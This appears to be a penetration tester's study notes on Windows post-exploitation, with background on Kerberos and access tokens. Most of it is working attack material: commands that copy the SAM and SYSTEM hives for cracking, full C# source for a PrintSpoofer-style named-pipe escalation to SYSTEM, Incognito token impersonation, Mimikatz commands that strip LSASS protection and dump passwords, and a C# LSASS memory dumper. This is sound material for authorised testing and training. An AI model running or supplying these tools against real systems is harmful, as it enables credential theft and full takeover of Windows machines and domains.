

Meterpreter:
[[General Meterpreter Post-exp]]


## Windows Creds

### SAM database

SID of the user is the unique user id in the windows system.
```
$env:computername
[wmi] "Win32_userAccount.Domain='corp1',Name='Administrator'"
```

The system has a lock on SAM DB file (c:\Windows\System32\config\sam), we can obtain it by making the shadow copy of the disk and copy the SAM DB from the shadow copy.

```
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
// Shadow copy volume path
```
Then: 
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam

// and copy the AES encryption key:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system

```

Or we can get the same info from registry:
```
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam

reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

We can either use Creddump7 or Mimikatz to decrypt the NTLM hash:
```
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
cd creddump7/
python pwdump.py /home/kali/system /home/kali/sam
```


### LAPS

```
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
Get-NetGroupMember -GroupName "LAPS Password Readers"


Get-LAPSComputers
```

### Access Tokens

With the whoami /priv we can view the user's access token privilages. 

While it is impossible to modify the set of privileges that are associated with an active logon session, it is however possible to add additional privileges that will take effect after the targeted user account logs out and logs back in.
Programmatically this can be done with the Win32 LsaAddAccountRights 699 API, but more often it would be performed through a group policy or locally through an application like secpol.msc

There are two types of access token - each process has two: one is the orginal one originating from the user and the second one is the impersonation token that can be create which allows a user to act on behalf of another user without that user's credentials. 
Impersonation tokens have four levels: Anonymous, Identification, Impersonation and Delegation. Anonymous and Identification only allows the enumeration of info.

Impersonation allows to impersonate the client's identity while Delegation makes i tpossible to perform the sequential access control checks across multiple machine (distibuted operations). 

#### Elevation with impersonation

There are nine different privileges that may allows for priv escalation from medium integrity to either high integiry or system integrity or enable compromised process to run as other user.

SeImpersonatePrivilege allows to impersonate any token for which we can get a reference or handle. The privilage is built-in in the LocalService - Network Service account which IIS account is assigned by default. That let us escalate the privilages potentially on any IIS.

If we have the SeImpersonatePrivilege we can use the WIN32 API DuplicateTokenEx call to create the primary token from the impersonation token to create the new process in the context of impersonated user. If no token in memory we can likely force the System account to give us its token to impersonate.

We will use windows pipes to leverage the SeImpersonatePrivilege. Windows Pipes are Interprocess communication like RPC, COM, sockets. A Pipe is a shared memory in kernel that process can use for interprocess comms. It is a client/server, pipe server can create the pipe and pipe clients connect to pipe to interact. Anonymous pipes are used for parent child processes comms, named pipes are more broadly used. We will use the named pipe which supports impersonation.

The techinque uses the print spool service which runs in the System context. Print Spooler monitor printer object changes and sends change notifications to print clients by connecting to their respective named pipes. To exploit this we need to create the process running with the SeImpersonatePrivialges running as the print client, we would be able to impersonate the System - that can be used both for LPE and Active Directory exploits. 

C# application, creates the pipe, waits for the connection and impersonates the clients that it attempts to connect to:
```
using System;

using System.Runtime.InteropServices;

namespace Impersonation
{

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public int Attributes;
    }
    public struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User;
    }
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
   uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
   uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool
        OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrntSpooferNet.exe pipename");
                return;
            }

            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName,3,0,10,0x1000,0x1000,0,IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);

            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;

            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);


            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

        }
    }
}


```

CreateNamedPipeA API requires to give the lpName which must follow the standarized format and be unique in the Operating System, like \\.\pipe\spoolss. However, there is a trick with path transformation, so in the SpoolSample we do:

```
SpoolSample.exe appsrv01 appsrv01/pipe/test
```

And in out binary we do:
```
Impersonate.exe \\.\pipe\test\pipe\spoolss
```

The whole code for impersonation, it works only with interactive shell:
```
using System;

using System.Runtime.InteropServices;

namespace Impersonation
{

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public int Attributes;
    }
    public struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode,
   uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize,
   uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool
        OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);


        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrntSpooferNet.exe pipename");
                return;
            }

            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);

            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;

            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);


            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);


            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            Console.WriteLine("Executing cmd.exe");
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
            


        }
    }
}
```

Code for running the PrintSpoofer inside the Meterpreter shell, requires the binary on the disk to run:

```
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace PrintSpoofer
{
    public class Program
    {
        public static uint PIPE_ACCESS_DUPLEX = 0x3;
        public static uint PIPE_TYPE_BYTE = 0x0;
        public static uint PIPE_WAIT = 0x0;
        public static uint TOKEN_ALL_ACCESS = 0xF01FF;
        public static uint TOKENUSER = 1;
        public static uint SECURITY_IMPERSONATION = 2;
        public static uint TOKEN_PRIMARY = 1;

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentThread();

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        public static void Main(string[] args)
        {
            // Parse arguments (pipe name)
            if (args.Length != 2)
            {
                Console.WriteLine("Please enter the pipe name to be used and the binary to trigger as arguments.\nExample: .\\PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss c:\\windows\\tasks\\bin.exe");
                return;
            }
            string pipeName = args[0];
            string binToRun = args[1];

            // Create our named pipe
            IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            // Connect to our named pipe and wait for another client to connect
            Console.WriteLine("Waiting for client to connect to named pipe...");
            bool result = ConnectNamedPipe(hPipe, IntPtr.Zero);

            // Impersonate the token of the incoming connection
            result = ImpersonateNamedPipeClient(hPipe);

            // Open a handle on the impersonated token
            IntPtr tokenHandle;
            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle);

            // Duplicate the stolen token
            IntPtr sysToken = IntPtr.Zero;
            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);

            // Create an environment block for the non-interactive session
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, sysToken, false);

            // Get the impersonated identity and revert to self to ensure we have impersonation privs
            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"Impersonated user is: {name}.");
            RevertToSelf();

            // Get the system directory
            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);

            // Spawn a new process with the duplicated token, a desktop session, and the created profile
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.lpDesktop = "WinSta0\\Default";
            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref sInfo, out pInfo);
            Console.WriteLine($"Executed '{binToRun}' with impersonated token!");
        }
    }
}
```



### Fun with Incognito

Incognito Meterpreter module can be used to impersonate any logged in users and obtain code execution in their context without password or hashes. This does not rely on Mimikatz.

To use it we must have the System integrity Meterpreter shell.
```
load incognito
list_tokens -u

e.g.
impersonate_token corp1\\admin
getuid

```

### Kerberos Authentication

Kerberos auth protocol explained:
1. User send the AS_REQ to the DC, with the timestamp encrypted using the user's password (The DC would check if the password is valid by doing the decryption, it checks also the timestamp for dups - replay attacks).
2. The DC replays with the AS_REP which has the session token and TGT - the session key is encrypted using the user's password hash so the client can decrypt and use it. TGT has improtant domain relation info (group membership, IP address of the klient and session key). To not tamper the TGT is encrypted by the secret known only to DC (by the password hash of the krbgt service). TGT is valid for 10h. 
3. When the user wants to access the Domain resources (SMB Share, Exchange - anything which has SPN in the Domain) the KDC is contact again with the TGS_REQ. It construct the TGS request with the user and timestamp encrypted using the session key and TGT. The DC uses the krbtgt to decrypt the TGT and then the session key (session key obtained from TGT) to decrypt the username requesting and timestamp.
4. If successful the TGS_REP is sent with the - SPN to which access is granted, a new session key to be used with the SPN, Service Ticket encrypted with the Service NTLM hash which has the session_key, username, timestamp, AD info etc. The SPN and session key are encrypted using the previous session key (from TGT).
Service Authentication:
5. Client sends the AP_REQ with the username and timestamp encrypted with the new session key and the service ticket. The service decrypts the ticket with its own password, then it checks everything and decrypts everything. 
6. Once the service confirms the authentication and authorization (group membership) etc. it responds to the client with the Application specific session (the client is authenticated).

Because of this protocol it mitigates the sniffing and replay attacks and can be done over unencrypted channel. However, there are issues - when krbtgt hash is compromised the user can forge any TGT (golden ticket); - when the SPN hash is compromised the user can forge any Service Tickets (silver ticket); - the user can crack service ticket for the service passwords offline (weak service password becomes the issue). 

### Mimikatz

Lsass stores the Hashes because of the cached Kerberos tickets.
To dump the hashes we need elevated command prompt - either the Admin elevated or the NT Authority\System - it is because we need the SeDebugPrivilege to read and modify the process; lsass.exe is owned 

```
mimikatz.exe
privilege::debug
```

In case where the LSA Protection is enabled we need the ability to execute the code in Windows Kernel. LSA Protection is there because of the Protected Processes Light (PPL), which is layered on top of the integrity level checks - event the System integrity process cannot modify or access the memory space of the System integrity process executing with the PPL. We can check the PPL inside the Registry in the DWORD RunAsPPL DWORD 1.

```
reg query HKLM\System\CurrentControlSet\Control\Lsa
```

It is disabled by default. When that enable we need to execute the kernel driver to disable LSA protection. In mimikatz shell:

```
!+
!processprotect /process:lsass.exe /remove
sekurlsa::logonpasswords
```

mimidrv.sys must be in the same directory and we need SeLoadDriverPrivilege privileges. The mimidrv.sys may trigger AV, however to dump the lsass when the PPL is enabled we need to transport it. But we do not need Mimikatz to run it, we can do this as a Windows service.

We can do the memory dump with either the Task Manager (GUI only) or with the ProcDump from SysInternals, but this may also be detected by AV. 

With the TaskManager you right click on the bottom bar, open the task manager, then go to details, find lsass.exe process, right click and do the Memory Dump. In mimikatz you can load the dump by:
```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Check Credentials Guard psh:
```
$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
```

with procdump from sysinternals you can dump lsass:
```
procdump -ma lsass.exe lsass.dmp
```

### MiniDumpWriteDump code

The following code can be used for Minidump C#:

```
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace MiniDump
{
    public class Program
    {
        static int MiniDumpWithFullMemory = 2;
        static UInt32 PROCESS_ALL_ACCESS = 0x001F0FFF;

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        public static void Main(string[] args)
        {
            // Get the PID of lsass.exe
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            Console.WriteLine($"Got lsass.exe PID: {lsass_pid}.");

            // Get a handle on LSASS
            IntPtr handle = OpenProcess(PROCESS_ALL_ACCESS, false, lsass_pid);
            Console.WriteLine($"Got a handle on lsass.exe: {handle}.");

            // Dump LSASS process to file
            string filePath = "C:\\Windows\\tasks\\lsass.dmp";
            FileStream dumpFile = new FileStream(filePath, FileMode.Create);
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (dumped)
            {
                Console.WriteLine($"Dumped LSASS memory to {filePath}.");
            }
            else
            {
                Console.WriteLine($"Error dumping LSASS memory: {Marshal.GetLastWin32Error()}");
            }
        }
    }
}
```